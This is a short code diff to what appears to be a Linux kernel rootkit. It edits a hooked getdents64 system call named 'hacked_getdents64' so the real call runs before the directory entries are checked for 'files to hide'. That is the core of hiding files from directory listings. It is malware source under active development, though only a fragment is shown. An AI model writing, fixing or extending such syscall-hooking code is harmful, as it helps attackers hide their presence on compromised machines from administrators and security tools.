@@ -147,6 +147,10 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 
 	printk(KERN_INFO "Running hacked_getdents64\n");
 
+	// run real getdents64 
+	actual_result = (*orig_getdents64)(fd,dirp,count);
+	hacked_result = actual_result;
+
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,count))
 		return -1;
@@ -155,9 +159,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	if (copy_from_user(kdirp,dirp,count))
 		return -1;
 
-	// run real getdents64 and check result for files to hide
-	actual_result = (*orig_getdents64)(fd,kdirp,count);
-	hacked_result = actual_result;
+	// check result for files to hide
 	if (actual_result > 0) { // actually read some bytes
 		printk(KERN_INFO "Checking dirp\n");
 		number_dirps = actual_result / sizeof(struct linux_dirent64);
